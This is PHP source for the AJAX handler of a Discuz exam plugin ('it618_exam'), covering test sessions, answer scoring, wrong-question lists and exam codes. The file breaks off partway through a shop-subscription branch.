<?php
/*
 * CopyRight  : [DisM!] (C)2001-2099 DisM Inc.
 * Created on : 2021-01-02,16:36:49
 * Author     : DisM!Ӧ������ dism.taobao.com $
 * Description: This is NOT a freeware, use is subject to license terms.
 * ����Դ��Դ�������ռ�,��������ѧϰ����������������ҵ��;����������24Сʱ��ɾ��!
 * ����ַ�������Ȩ��,�뼰ʱ��֪����,���Ǽ���ɾ��!
 */

if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

require_once DISCUZ_ROOT.'./source/plugin/it618_exam/exam_function.func.php';

$uid = $_G['uid'];
$it618_pid=intval($_GET['it618_pid']);

$pagetype=$_GET['pagetype'];


if($_GET['ac']=="getmode"){
	$modeid=intval($_GET['modeid']);
	require_once DISCUZ_ROOT.'./source/plugin/it618_exam/getmode.func.php';
	
	if($it618_exam_diy=C::t('#it618_exam#it618_exam_diy')->fetch_by_id($modeid)){
		if($it618_exam_diy['it618_isjs']==1){
			if((time()-$it618_exam_diy["it618_time"])<(60*$it618_exam_diy["it618_catchtime"])){
				exit;
			}else{
				C::t('#it618_exam#it618_exam_diy')->update_it618_time_by_id(time(),$it618_exam_diy["id"]);
			}
			
			$tmpstr = it618_exam_getmodecontent($it618_exam_diy['it618_type'],$it618_exam_diy['it618_sql'],$it618_exam_diy['it618_modecode'],$it618_exam_diy['it618_count']);
			$tmpstr=str_replace(array("\r\n", "\r", "\n"),"",$tmpstr);
			$tmpstr=str_replace("'",'"',$tmpstr);
			
			echo "document.write('".$tmpstr."')";
		}
	}

	exit;
}


if($_GET['ac']=="pcstyle"){
	dsetcookie('it618_exam_pcstylename',$_GET['stylename'],31536000);
	echo 'ok';exit;
}


if($_GET['ac']=="appad"){
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_exam/config/appad.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_exam/config/appad.php';
	}
	dsetcookie('it618_exam_appad',$_G['timestamp'],$appad_cookiestime*60);
	echo 'ok';exit;
}


if($_GET['ac']=="testajax"){
	if($it618_exam_test=C::t('#it618_exam#it618_exam_test')->fetch_by_it618_testcode($_GET['testcode'])){
		dsetcookie('it618exam_ucode',$it618_exam_test['it618_ucode'],10);
		
		C::t('#it618_exam#it618_exam_test')->update($it618_exam_test['id'],array(
			'it618_etime' => $_G['timestamp']
		));
		
		$eid=intval($_GET['eid']);
		$eqindex=intval($_GET['eqindex']);
		if($eqindex==0)$eqindex=1;
		C::t('#it618_exam#it618_exam_test_exam')->update($eid,array(
			'it618_qindex' => $eqindex
		));
	}else{
		echo 'it618_splitone';exit;
	}
}


if($_GET['ac']=="utestajax"){
	if($it618_exam_utest=C::t('#it618_exam#it618_exam_utest')->fetch_by_it618_testcode($_GET['testcode'])){
		dsetcookie('it618uexam_ucode',$it618_exam_utest['it618_ucode'],10);
		
		C::t('#it618_exam#it618_exam_utest')->update($it618_exam_utest['id'],array(
			'it618_etime' => $_G['timestamp']
		));
		
		$eid=intval($_GET['eid']);
		$eqindex=intval($_GET['eqindex']);
		if($eqindex==0)$eqindex=1;
		C::t('#it618_exam#it618_exam_utest_exam')->update($eid,array(
			'it618_qindex' => $eqindex
		));
	}else{
		echo 'it618_splitone';exit;
	}
}


if($_GET['ac']=="err_save"){
	if($uid>0){
		if($it618_exam_test_exam_questions=C::t('#it618_exam#it618_exam_test_exam_questions')->fetch_by_id($_GET['eqid'])){
			$it618_exam_test_exam=C::t('#it618_exam#it618_exam_test_exam')->fetch_by_id($it618_exam_test_exam_questions['it618_eid']);
			if($it618_exam_test_exam['it618_uid']==$uid){
				if($it618_exam_errquestions=C::t('#it618_exam#it618_exam_errquestions')->fetch_by_qid_uid($it618_exam_test_exam_questions['it618_qid'],$it618_exam_test_exam['it618_uid'])){
					C::t('#it618_exam#it618_exam_errquestions')->delete_by_id($it618_exam_errquestions['id']);
				}else{
					C::t('#it618_exam#it618_exam_errquestions')->insert(array(
						'it618_uid' => $uid,
						'it618_eid' => $it618_exam_test_exam_questions['it618_eid'],
						'it618_pid' => $it618_exam_test_exam_questions['it618_pid'],
						'it618_qid' => $it618_exam_test_exam_questions['it618_qid'],
						'it618_time' => $_G['timestamp']
					), true);
				}
			}
		}
	}
}


if($_GET['ac']=="uerr_save"){
	if($uid>0){
		if($it618_exam_utest_exam_questions=C::t('#it618_exam#it618_exam_utest_exam_questions')->fetch_by_id($_GET['eqid'])){
			$it618_exam_utest_exam=C::t('#it618_exam#it618_exam_utest_exam')->fetch_by_id($it618_exam_utest_exam_questions['it618_eid']);
			if($it618_exam_utest_exam['it618_uid']==$uid){
				if($it618_exam_errquestions=C::t('#it618_exam#it618_exam_errquestions')->fetch_by_qid_uid($it618_exam_utest_exam_questions['it618_qid'],$it618_exam_utest_exam['it618_uid'])){
					C::t('#it618_exam#it618_exam_errquestions')->delete_by_id($it618_exam_errquestions['id']);
				}else{
					C::t('#it618_exam#it618_exam_errquestions')->insert(array(
						'it618_uid' => $uid,
						'it618_eid' => $it618_exam_utest_exam_questions['it618_eid'],
						'it618_pid' => 0,
						'it618_qid' => $it618_exam_utest_exam_questions['it618_qid'],
						'it618_time' => $_G['timestamp']
					), true);
				}
			}
		}
	}
}


if($_GET['ac']=="testsave"){
	if($it618_exam_test=C::t('#it618_exam#it618_exam_test')->fetch_by_it618_testcode($_GET['testcode'])){
		$eid=intval($_GET['eid']);$eqindex=intval($_GET['eqindex']);
		if($it618_exam_test_exam=C::t('#it618_exam#it618_exam_test_exam')->fetch_by_id($eid)){
			if($it618_exam_test_exam['it618_state']!=3&&$it618_exam_test_exam['it618_uid']==$uid){
				$eqid=intval($_GET['eqid']);
				if($it618_exam_test_exam_questions=C::t('#it618_exam#it618_exam_test_exam_questions')->fetch_by_id($eqid)){
					if($it618_exam_test_exam_questions['it618_eid']==$eid){
						$it618_exam_questions=C::t('#it618_exam#it618_exam_questions')->fetch_by_id($it618_exam_test_exam_questions['it618_qid']);
						$it618_qtypeid=$it618_exam_questions['it618_qtypeid'];
						
						if($it618_qtypeid==2||$it618_qtypeid==3){
							$questionvalue_array = !empty($_GET['questionvalue']) ? $_GET['questionvalue'] : array();
							$it618_value=implode('it618_split',$questionvalue_array);
							$it618_value=it618_exam_utftogbk($it618_value);
							$questionvalue_array=explode("it618_split",$it618_value);
						}else{
							$questionvalue=it618_exam_utftogbk($_GET['questionvalue']);
							$it618_value=$questionvalue;
						}
						
						$it618_testscore=0;
						$it618_isok=0;
						
						if($it618_qtypeid==1||$it618_qtypeid==2){
							$ok=0;$testok=0;$testerr=0;
							$query = DB::query("SELECT * FROM ".DB::table('it618_exam_questions_option')." WHERE it618_isok=1 and it618_qid=".$it618_exam_questions['id']);
							while($it618_exam_questions_option = DB::fetch($query)) {
								if($it618_qtypeid==1){
									if($questionvalue==$it618_exam_questions_option['id']){
										$testok=$testok+1;
									}
								}else{
									foreach($questionvalue_array as $key => $questionvalue) {
										if($questionvalue==$it618_exam_questions_option['id']){
											$testok=$testok+1;
											break;
										}
									}
								}
								$ok=$ok+1;
							}
							
							if($it618_qtypeid==1){
								if($testok==$ok&&$ok>0){
									$it618_testscore=$it618_exam_test_exam_questions['it618_score'];
									$it618_isok=1;
								}
							}else{
								$query = DB::query("SELECT * FROM ".DB::table('it618_exam_questions_option')." WHERE it618_isok=0 and it618_qid=".$it618_exam_questions['id']);
								while($it618_exam_questions_option = DB::fetch($query)) {
									foreach($questionvalue_array as $key => $questionvalue) {
										if($questionvalue==$it618_exam_questions_option['id']){
											$testerr=$testerr+1;
											break;
										}
									}
								}
								
								if($testerr==0&&$ok>0){
									if($testok==$ok){
										$it618_testscore=$it618_exam_test_exam_questions['it618_score'];
										$it618_isok=1;
									}else{
										$it618_testscore=$it618_exam_test_exam_questions['it618_mcqscore'];
									}
								}
							}

						}
						
						if($it618_qtypeid==3){
							$ok=0;$testok=0;
							$query = DB::query("SELECT * FROM ".DB::table('it618_exam_questions_option')." WHERE it618_qid=".$it618_exam_questions['id']);
							while($it618_exam_questions_option = DB::fetch($query)) {
								if($questionvalue_array[$ok]==$it618_exam_questions_option['it618_name']){
									$testok=$testok+1;
								}
								$ok=$ok+1;
							}
							
							if($testok>0){
								$it618_testscore=$it618_exam_test_exam_questions['it618_score']/$ok*$testok;
								if($testok==$ok)$it618_isok=1;
							}
						}
						
						if($it618_qtypeid==4){
							if($questionvalue==$it618_exam_questions['it618_isok']){
								$it618_testscore=$it618_exam_test_exam_questions['it618_score'];
								$it618_isok=1;
							}
						}
						
						if($it618_qtypeid==5){
							$it618_testscore=0;
							$it618_isok=1;
						}
						
						C::t('#it618_exam#it618_exam_test_exam_questions')->update($eqid,array(
							'it618_value' => $it618_value,
							'it618_testscore' => $it618_testscore,
							'it618_isbj' => $_GET['eqbj'],
							'it618_isok' => $it618_isok
						));
						
						if($it618_value!=''){
							echo 'it618_splittestokit618_split'.$eqindex;
						}else{
							echo 'it618_splitokit618_split'.$eqindex;
						}
					}
				}
			}
		}
	}
}


if($_GET['ac']=="utestsave"){
	if($it618_exam_utest=C::t('#it618_exam#it618_exam_utest')->fetch_by_it618_testcode($_GET['testcode'])){
		$eid=intval($_GET['eid']);$eqindex=intval($_GET['eqindex']);
		if($it618_exam_utest_exam=C::t('#it618_exam#it618_exam_utest_exam')->fetch_by_id($eid)){
			if($it618_exam_utest_exam['it618_state']!=3&&$it618_exam_utest_exam['it618_uid']==$uid){
				$eqid=intval($_GET['eqid']);
				if($it618_exam_utest_exam_questions=C::t('#it618_exam#it618_exam_utest_exam_questions')->fetch_by_id($eqid)){
					if($it618_exam_utest_exam_questions['it618_eid']==$eid){
						$it618_exam_questions=C::t('#it618_exam#it618_exam_questions')->fetch_by_id($it618_exam_utest_exam_questions['it618_qid']);
						$it618_qtypeid=$it618_exam_questions['it618_qtypeid'];
						
						if($it618_qtypeid==2||$it618_qtypeid==3){
							$questionvalue_array = !empty($_GET['questionvalue']) ? $_GET['questionvalue'] : array();
							$it618_value=implode('it618_split',$questionvalue_array);
							$it618_value=it618_exam_utftogbk($it618_value);
							$questionvalue_array=explode("it618_split",$it618_value);
						}else{
							$questionvalue=it618_exam_utftogbk($_GET['questionvalue']);
							$it618_value=$questionvalue;
						}
						
						$it618_isok=0;
						
						if($it618_qtypeid==1||$it618_qtypeid==2){
							$ok=0;$testok=0;$testerr=0;
							$query = DB::query("SELECT * FROM ".DB::table('it618_exam_questions_option')." WHERE it618_isok=1 and it618_qid=".$it618_exam_questions['id']);
							while($it618_exam_questions_option = DB::fetch($query)) {
								if($it618_qtypeid==1){
									if($questionvalue==$it618_exam_questions_option['id']){
										$testok=$testok+1;
									}
								}else{
									foreach($questionvalue_array as $key => $questionvalue) {
										if($questionvalue==$it618_exam_questions_option['id']){
											$testok=$testok+1;
											break;
										}
									}
								}
								$ok=$ok+1;
							}
							
							if($it618_qtypeid==1){
								if($testok==$ok&&$ok>0){
									$it618_isok=1;
								}
							}else{
								$query = DB::query("SELECT * FROM ".DB::table('it618_exam_questions_option')." WHERE it618_isok=0 and it618_qid=".$it618_exam_questions['id']);
								while($it618_exam_questions_option = DB::fetch($query)) {
									foreach($questionvalue_array as $key => $questionvalue) {
										if($questionvalue==$it618_exam_questions_option['id']){
											$testerr=$testerr+1;
											break;
										}
									}
								}
								
								if($testerr==0&&$ok>0){
									if($testok==$ok){
										$it618_isok=1;
									}
								}
							}

						}
						
						if($it618_qtypeid==3){
							$ok=0;$testok=0;
							$query = DB::query("SELECT * FROM ".DB::table('it618_exam_questions_option')." WHERE it618_qid=".$it618_exam_questions['id']);
							while($it618_exam_questions_option = DB::fetch($query)) {
								foreach($questionvalue_array as $key => $questionvalue) {
									if($questionvalue==$it618_exam_questions_option['it618_name']){
										$testok=$testok+1;
									}
								}
								$ok=$ok+1;
							}
							
							if($testok>0){
								$it618_testscore=$it618_exam_test_exam_questions['it618_score']/$ok*$testok;
								if($testok==$ok)$it618_isok=1;
							}
						}
						
						if($it618_qtypeid==4){
							if($questionvalue==$it618_exam_questions['it618_isok']){
								$it618_isok=1;
							}
						}
						
						C::t('#it618_exam#it618_exam_utest_exam_questions')->update($eqid,array(
							'it618_value' => $it618_value,
							'it618_isbj' => $_GET['eqbj'],
							'it618_isok' => $it618_isok
						));
						
						if($it618_value!=''){
							echo 'it618_splittestokit618_split'.$eqindex;
						}else{
							echo 'it618_splitokit618_split'.$eqindex;
						}
					}
				}
			}
		}
	}
}


if($_GET['ac']=="testok"){
	if($it618_exam_test=C::t('#it618_exam#it618_exam_test')->fetch_by_it618_testcode($_GET['testcode'])){
		$eid=intval($_GET['eid']);
		if($it618_exam_test_exam=C::t('#it618_exam#it618_exam_test_exam')->fetch_by_id($eid)){
			if($it618_exam_test_exam['it618_state']!=3&&$it618_exam_test_exam['it618_uid']==$uid){
				if($it618_exam_test_exam['it618_etime']>$_G['timestamp'])$it618_etime=$_G['timestamp'];else $it618_etime=$it618_exam_test_exam['it618_etime'];
				
				$it618_testscore=C::t('#it618_exam#it618_exam_test_exam_questions')->sum_testscore_by_eid($eid);
				C::t('#it618_exam#it618_exam_test_exam')->update($eid,array(
					'it618_testscore' => $it618_testscore,
					'it618_state' => 3,
					'it618_etime' => $it618_etime
				));
				
				if(C::t('#it618_exam#it618_exam_user')->count_by_uid_ok($uid)>0){
					$tmptime=$_G['timestamp'];
					$query = DB::query("SELECT * FROM ".DB::table('it618_exam_test_exam_questions')." WHERE it618_isok!=1 and it618_eid=".$eid." ORDER BY it618_order,id");
					while($it618_exam_test_exam_questions = DB::fetch($query)) {
						$it618_exam_questions=C::t('#it618_exam#it618_exam_questions')->fetch_by_id($it618_exam_test_exam_questions['it618_qid']);
						if($it618_exam_questions['it618_qtypeid']!=5){
							if(C::t('#it618_exam#it618_exam_errquestions')->count_by_qid_uid($it618_exam_test_exam_questions['it618_qid'],$uid)==0){
								C::t('#it618_exam#it618_exam_errquestions')->insert(array(
									'it618_uid' => $uid,
									'it618_eid' => $it618_exam_test_exam_questions['it618_eid'],
									'it618_pid' => $it618_exam_test_exam_questions['it618_pid'],
									'it618_qid' => $it618_exam_test_exam_questions['it618_qid'],
									'it618_time' => $tmptime
								), true);
							}
						}
					}
				}
				
				if($it618_exam['exam_scoreforum']>0){
					$fid=$it618_exam['exam_scoreforum'];
					$it618_exam_goods=C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_test_exam['it618_pid']);
					
					$subject=$it618_exam['exam_scoretietitle'];
					$subject=str_replace("{testname}",$it618_exam_goods['it618_name'],$subject);
					$subject=str_replace("{testscore}",$it618_testscore,$subject);
					
					$subject=$it618_exam['exam_scoretietitle'];
					$subject=str_replace("{testname}",$it618_exam_goods['it618_name'],$subject);
					$subject=str_replace("{testscore}",$it618_testscore,$subject);
					
					$tid=C::t('forum_thread')->insert(array(
						'fid' => $fid,
						'author' => $_G['username'],
						'authorid' => $uid,
						'subject' => $subject,
						'dateline' => $_G['timestamp'],
						'lastpost' => $_G['timestamp'],
						'lastposter' => $_G['username']
					), true);
					
					$tmpurl=$_G['siteurl'].it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
					
					$postdata=array(
						'fid' => $fid,
						'tid' => $tid,
						'first' => 1,
						'author' => $_G['username'],
						'authorid' => $uid,
						'subject' => $subject,
						'dateline' => $_G['timestamp'],
						'message' => '[url='.$tmpurl.']'.$tmpurl.'[/url]',
						'useip' => $_G['clientip'],
						'port' => $_G['remoteport']
					);
					
					require_once libfile('function/forum');
					insertpost($postdata);
					
					C::t('#it618_exam#it618_exam_test_exam')->update($eid,array(
						'it618_tieid' => $tid
					));
				}
				
				echo 'it618_splitok';exit;
			}
		}
	}
}


if($_GET['ac']=="utestok"){
	if($it618_exam_utest=C::t('#it618_exam#it618_exam_utest')->fetch_by_it618_testcode($_GET['testcode'])){
		$eid=intval($_GET['eid']);
		if($it618_exam_utest_exam=C::t('#it618_exam#it618_exam_utest_exam')->fetch_by_id($eid)){
			if($it618_exam_utest_exam['it618_state']!=3&&$it618_exam_utest_exam['it618_uid']==$uid){
				if($it618_exam_utest_exam['it618_etime']>$_G['timestamp'])$it618_etime=$_G['timestamp'];else $it618_etime=$it618_exam_utest_exam['it618_etime'];
				
				$it618_rightcount=0;
				$query = DB::query("SELECT * FROM ".DB::table('it618_exam_utest_exam_questions')." WHERE it618_eid=".$eid." ORDER BY it618_order,id");
				while($it618_exam_utest_exam_questions = DB::fetch($query)) {
					if($it618_exam_utest_exam_questions['it618_isok']==1){
						C::t('#it618_exam#it618_exam_errquestions')->delete_by_qid_uid($it618_exam_utest_exam_questions['it618_qid'],$uid);
						$it618_rightcount=$it618_rightcount+1;
					}
				}
				
				C::t('#it618_exam#it618_exam_utest_exam')->update($eid,array(
					'it618_rightcount' => $it618_rightcount,
					'it618_state' => 3,
					'it618_etime' => $it618_etime
				));

				echo 'it618_splitok';exit;
			}
		}
	}
}


if($_GET['ac']=="getexamcode"){
	if($uid==0)exit;
		
	if($it618_exam_examwork=C::t('#it618_exam#it618_exam_examwork')->fetch_by_it618_code($_GET['code'])){
		
		C::t('#it618_exam#it618_exam_examwork')->delete_by_id($it618_exam_examwork['id']);
	
		$it618exam_ucode=getcookie('it618exam_ucode');
		if($it618exam_ucode==''){
			$it618exam_ucode=md5($uid.$_G['clientip'].$_G['timestamp'].$_GET['code']);
			dsetcookie('it618exam_ucode',$it618exam_ucode,10);
		}
		
		$tmparr=explode("it618_split",$it618_exam_examwork['it618_exam']);
		if($_GET['type']=='testabout'){
			$pid=$tmparr[1];
			usleep(mt_rand(300,1000000));
		}else{
			$eid=$tmparr[1];
			$it618_exam_test_exam=C::t('#it618_exam#it618_exam_test_exam')->fetch_by_id($eid);
			if($it618_exam_test_exam['it618_state']!=3){
				$pid=$it618_exam_test_exam['it618_pid'];
			}else{
				$it618_exam_goods=C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_test_exam['it618_pid']);
				$it618_testscore=$it618_exam_test_exam['it618_testscore'];
				if($it618_testscore=='')$it618_testscore=0;
				$it618_testscore=str_replace(".0","",$it618_testscore);
				
				$it618_score=$it618_exam_test_exam['it618_score'];
				$it618_score=str_replace(".0","",$it618_score);
				
				$ischat=0;
				if($it618_exam_goods['it618_ischat']==2||$it618_exam_goods['it618_ischat']==3){
					$ischat=1;
				}
				
				$isnote=0;
				if($it618_exam_goods['it618_isnote']==2||$it618_exam_goods['it618_isnote']==3){
					$isnote=1;
				}
				
				$examstr=it618_exam_getexam($eid,$_GET['wap']);
				echo 'it618_splitreadit618_split'.$it618_exam_test_exam['it618_questioncount'].'it618_split1it618_split'.$examstr.'it618_split'.$it618_testscore.'/'.$it618_score.'it618_split'.$ischat.'it618_split'.$isnote;exit;
			}
		}
		
		$it618_exam_goods=C::t('#it618_exam#it618_exam_goods')->fetch_by_id($pid);
		
		$testcode=md5($uid.$_G['clientip'].$_G['timestamp']);
		if($it618_exam_test=C::t('#it618_exam#it618_exam_test')->fetch_by_pid_uid($pid,$uid)){
			$it618_ips=$it618_exam_test['it618_ips'];
			$tmparr=explode($_G['clientip'],$it618_exam_test['it618_ips']);
			if(count($tmparr)==1){
				if($it618_exam_test['it618_ips']==''){
					$it618_ips=$_G['clientip'];
				}else{
					$it618_ips=$it618_exam_test['it618_ips'].','.$_G['clientip'];
				}
			}
			
			C::t('#it618_exam#it618_exam_test')->update($it618_exam_test['id'],array(
				'it618_btime' => $_G['timestamp'],
				'it618_etime' => $_G['timestamp'],
				'it618_ip' => $_G['clientip'],
				'it618_ips' => $it618_ips,
				'it618_testcode' => $testcode,
				'it618_ucode' => $it618exam_ucode
			));
		}else{

			if($it618_exam_goods['it618_gtype']==1){
				$it618_btime=$_G['timestamp'];
			}else{
				$it618_btime=strtotime($it618_exam_goods['it618_xgtime1']);
			}
			
			$eid=C::t('#it618_exam#it618_exam_test')->insert(array(
				'it618_uid' => $uid,
				'it618_shopid' => $it618_exam_goods['it618_shopid'],
				'it618_pid' => $it618_exam_goods['id'],
				'it618_btime' => $it618_btime,
				'it618_etime' => $_G['timestamp'],
				'it618_ip' => $_G['clientip'],
				'it618_ips' => $_G['clientip'],
				'it618_testcode' => $testcode,
				'it618_ucode' => $it618exam_ucode
			), true);
			
			if($it618_exam_goods['it618_gtype']==2){
				$it618_exam_goods_user=C::t('#it618_exam#it618_exam_goods_user')->fetch_by_pid_uid($it618_exam_goods['id'],$uid);
				C::t('#it618_exam#it618_exam_goods_user')->update($it618_exam_goods_user['id'],array(
					'it618_eid' => $eid,
					'it618_state' => 2,
					'it618_time' => $_G['timestamp']
				));
			}
			
			if(C::t('#it618_exam#it618_exam_test_pj')->count_by_pid_uid($pid,$uid)==0){
				C::t('#it618_exam#it618_exam_test_pj')->insert(array(
					'it618_uid' => $uid,
					'it618_shopid' => $it618_exam_goods['it618_shopid'],
					'it618_pid' => $pid,
					'it618_time' => $_G['timestamp']
				), true);
			}

		}
		
		if($it618_exam_test=C::t('#it618_exam#it618_exam_test')->fetch_by_uid_etime($uid)){
			if($_G['timestamp']-$it618_exam_test['it618_etime']<6){
				if($it618_exam_test['it618_ucode']!=$it618exam_ucode){
					echo 'it618_splitoneit618_split'.$it618_exam_lang['s929'].' '.$_G['username'].' '.$it618_exam_lang['s930'];
					exit;
				}
			}
		}
		
		if($_GET['type']=='testabout'){
			if($it618_exam_test_exam=C::t('#it618_exam#it618_exam_test_exam')->fetch_by_pid_uid_state12($pid,$uid)){
				echo 'it618_splittest';exit;
			}else{
				set_time_limit (0);
				ignore_user_abort(true);
				
				$it618_answertype=$it618_exam_goods['it618_answertype'];
		
				$it618_eindex=C::t('#it618_exam#it618_exam_test_exam')->count_by_pid_uid($pid,$uid)+1;
				
				if($it618_exam_goods['it618_gtype']==1){
					$it618_btime=$_G['timestamp'];
				}else{
					$it618_btime=strtotime($it618_exam_goods['it618_xgtime1']);
				}
				
				$eid=C::t('#it618_exam#it618_exam_test_exam')->insert(array(
					'it618_uid' => $uid,
					'it618_shopid' => $it618_exam_goods['it618_shopid'],
					'it618_pid' => $pid,
					'it618_type' => $it618_exam_goods['it618_gtype'],
					'it618_answertype' => $it618_answertype,
					'it618_eindex' => $it618_eindex,
					'it618_score' => $it618_exam_goods['it618_examscore'],
					'it618_questioncount' => $it618_exam_goods['it618_questioncount'],
					'it618_isvip' => $_GET['utype'],
					'it618_examtime' => $it618_exam_goods['it618_examtime'],
					'it618_btime' => $it618_btime,
					'it618_etime' => $it618_btime+$it618_exam_goods['it618_examtime']*60,
					'it618_state' => 1
				), true);
				
				if($it618_eindex==1)C::t('#it618_exam#it618_exam_goods')->update_it618_tests_by_id($pid);
				if($_GET['utype']!=1){
					if(C::t('#it618_exam#it618_exam_goods_type')->counttype_by_pid_ok($pid)>0){
						if($it618_exam_goods_count=C::t('#it618_exam#it618_exam_goods_count')->fetch_by_uid_pid($uid,$pid)){
							DB::query("update ".DB::table('it618_exam_goods_count')." set it618_testcount=it618_testcount+1 where id=".$it618_exam_goods_count['id']);
						}
					}
				}
				
				$query = DB::query("SELECT * FROM ".DB::table('it618_exam_goods_lesson')." WHERE it618_pid=".$pid." ORDER BY it618_order,id");
				while($it618_exam_goods_lesson = DB::fetch($query)) {
					if($it618_exam_goods_lesson['it618_type']==1){
						$query1 = DB::query("SELECT * FROM ".DB::table('it618_exam_goods_questions')." WHERE it618_lid=".$it618_exam_goods_lesson['id']." ORDER BY it618_order");
					}else{
						$query1 = DB::query("SELECT * FROM ".DB::table('it618_exam_goods_questions')." WHERE it618_lid=".$it618_exam_goods_lesson['id']." ORDER BY RAND() LIMIT ".$it618_exam_goods_lesson['it618_randcount']);
					}
					
					while($it618_exam_goods_questions = DB::fetch($query1)) {
						C::t('#it618_exam#it618_exam_test_exam_questions')->insert(array(
							'it618_eid' => $eid,
							'it618_pid' => $pid,
							'it618_lid' => $it618_exam_goods_questions['it618_lid'],
							'it618_score' => $it618_exam_goods_questions['it618_score'],
							'it618_mcqscore' => $it618_exam_goods_questions['it618_mcqscore'],
							'it618_qid' => $it618_exam_goods_questions['it618_qid']
						), true);
					}
				}
				
			}
		}
		
		if($_GET['type']=='test'){			
			$examstr=it618_exam_getexam($eid,$_GET['wap']);
			
			$btimestr=date('Y-m-d H:i:s', $_G['timestamp']);
			$etimestr=date('Y-m-d H:i:s', $it618_exam_test_exam['it618_etime']);
			
			$ischat=0;
			if($it618_exam_goods['it618_ischat']==2||$it618_exam_goods['it618_ischat']==3){
				$ischat=1;
			}
			
			$isnote=0;
			if($it618_exam_goods['it618_isnote']==2||$it618_exam_goods['it618_isnote']==3){
				$isnote=1;
			}
			
			echo 'it618_splittestit618_split'.$it618_exam_test_exam['it618_questioncount'].'it618_split'.$it618_exam_test_exam['it618_qindex'].'it618_split'.$examstr.'it618_split'.$btimestr.'it618_split'.$etimestr.'it618_split'.$testcode.'it618_split'.$it618_exam_test_exam['it618_answertype'].'it618_split'.$ischat.'it618_split'.$isnote;exit;
		}else{
			echo 'it618_splitok';exit;
		}
		
	}

	exit;
}


if($_GET['ac']=="getuexamcode"){
	if($uid==0)exit;
		
	if($it618_exam_uexamwork=C::t('#it618_exam#it618_exam_uexamwork')->fetch_by_it618_code($_GET['code'])){
		
		C::t('#it618_exam#it618_exam_uexamwork')->delete_by_id($it618_exam_uexamwork['id']);
		
		$eid=$it618_exam_uexamwork['it618_tmpid'];
		$it618_exam_utest_exam=C::t('#it618_exam#it618_exam_utest_exam')->fetch_by_id($eid);
		if($it618_exam_utest_exam['it618_state']!=3){
			$shopid=$it618_exam_utest_exam['it618_shopid'];
		}else{
			$examstr=it618_exam_getuexam($eid,$_GET['wap']);
			$rightcount=$it618_exam_utest_exam['it618_rightcount'];
			$questioncount=$it618_exam_utest_exam['it618_questioncount'];
			$bl=round($rightcount/$questioncount,2)*100;
			
			echo 'it618_splitreadit618_split'.$questioncount.'it618_split1it618_split'.$examstr.'it618_split'.$rightcount.'/'.$bl.'%';exit;
		}
		
		$it618uexam_ucode=getcookie('it618uexam_ucode');
		if($it618uexam_ucode==''){
			$it618uexam_ucode=md5($uid.$_G['clientip'].$_G['timestamp'].$_GET['code']);
			dsetcookie('it618uexam_ucode',$it618uexam_ucode,10);
		}
		
		$testcode=md5($uid.$_G['clientip'].$_G['timestamp']);
		if($it618_exam_utest=C::t('#it618_exam#it618_exam_utest')->fetch_by_shopid_uid($shopid,$uid)){
			$it618_ips=$it618_exam_utest['it618_ips'];
			$tmparr=explode($_G['clientip'],$it618_exam_utest['it618_ips']);
			if(count($tmparr)==1){
				if($it618_exam_utest['it618_ips']==''){
					$it618_ips=$_G['clientip'];
				}else{
					$it618_ips=$it618_exam_utest['it618_ips'].','.$_G['clientip'];
				}
			}
			
			C::t('#it618_exam#it618_exam_utest')->update($it618_exam_utest['id'],array(
				'it618_btime' => $_G['timestamp'],
				'it618_etime' => $_G['timestamp'],
				'it618_ip' => $_G['clientip'],
				'it618_ips' => $it618_ips,
				'it618_testcode' => $testcode,
				'it618_ucode' => $it618uexam_ucode
			));
		}else{

			C::t('#it618_exam#it618_exam_utest')->insert(array(
				'it618_uid' => $uid,
				'it618_shopid' => $shopid,
				'it618_btime' => $_G['timestamp'],
				'it618_etime' => $_G['timestamp'],
				'it618_ip' => $_G['clientip'],
				'it618_ips' => $_G['clientip'],
				'it618_testcode' => $testcode,
				'it618_ucode' => $it618uexam_ucode
			), true);

		}
		
		if($it618_exam_utest=C::t('#it618_exam#it618_exam_utest')->fetch_by_uid_etime($uid)){
			if($_G['timestamp']-$it618_exam_utest['it618_etime']<6){
				if($it618_exam_utest['it618_ucode']!=$it618uexam_ucode){
					echo 'it618_splitoneit618_split'.$it618_exam_lang['s929'].' '.$_G['username'].' '.$it618_exam_lang['s930'];
					exit;
				}
			}
		}
				
		$examstr=it618_exam_getuexam($eid,$_GET['wap']);
		
		$btimestr=date('Y-m-d H:i:s', $_G['timestamp']);
		$etimestr=date('Y-m-d H:i:s', $it618_exam_utest_exam['it618_etime']);
		
		echo 'it618_splittestit618_split'.$it618_exam_utest_exam['it618_questioncount'].'it618_split'.$it618_exam_utest_exam['it618_qindex'].'it618_split'.$examstr.'it618_split'.$btimestr.'it618_split'.$etimestr.'it618_split'.$testcode.'it618_split'.$it618_exam_utest_exam['it618_answertype'];exit;
		
	}

	exit;
}


if($_GET['ac']=="getformhash"){
	echo 'it618_split'.FORMHASH.'it618_split';exit;
}


if($_GET['ac']=="getlivecontent"){	
	echo it618_exam_getlivecontent($_GET['liveid'],$_GET['wap']);
	exit;
}


if($_GET['ac']=="sc_top"){	
	$ktxmoney = C::t('#it618_exam#it618_exam_shop')->fetch_money_by_id($_GET['sid']);
	$sqmoney=C::t('#it618_exam#it618_exam_tx')->sumtxmoney_by_shopid_state($_GET['sid'],1);
	$txmoney=C::t('#it618_exam#it618_exam_tx')->sumtxmoney_by_shopid_state($_GET['sid'],2);
	
	if($sqmoney=='')$sqmoney='0.00';
	if($txmoney=='')$txmoney='0.00';else $txmoney=round($txmoney,2);
	
	echo '<font color=#fff><strong>'.$_G['username'].'</strong></font> '.it618_exam_getlang('s420').'<font color=#6F0>'.$ktxmoney.'</font> '.it618_exam_getlang('s421').'<font color=#FF6>'.$sqmoney.'</font> '.it618_exam_getlang('s422').'<font color=#FF6>'.$txmoney.'</font> '.it618_exam_getlang('s125').'it618_split'.FORMHASH;
}


if($_GET['ac']=="shopsubscribe"){	
	if($uid<=0){
		echo it618_exam_getlang('s485');
	}else{
		if($it618_exam_shop_subscribe=C::t('#it618_exam#it618_exam_shop_subscribe')->fetch_by_shopid_uid($_GET['shopid'],$uid)){
			C::t('#it618_exam#it618_exam_shop_subscribe')->delete_by_id($it618_exam_shop_subscribe['id']);

